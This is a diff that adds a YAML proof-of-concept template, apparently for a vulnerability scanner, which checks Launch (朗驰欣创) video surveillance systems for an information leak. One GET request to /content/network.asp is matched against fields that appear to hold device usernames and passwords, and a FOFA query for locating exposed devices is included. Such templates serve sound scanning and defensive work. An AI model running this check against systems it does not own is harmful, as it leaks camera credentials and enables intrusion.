@@ -1,0 +1,15 @@
+id: poc-yaml-launch-vms-network-info-leak
+info:
+  name: 朗驰欣创视频监控系统 network 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 朗驰欣创视频监控系统
+  fofa: app="朗驰欣创-视频监控"
+requests:
+- method: GET
+  path: /content/network.asp
+  expression: status_code == 200 && contains(headers,"GoAhead-Webs") && matches(body,"oeusr=\"([0-9a-zA-Z]+)\"")
+    && matches(body,"oepsw=\"([0-9a-zA-Z]+)\"")
+variables: {}
+transport: http
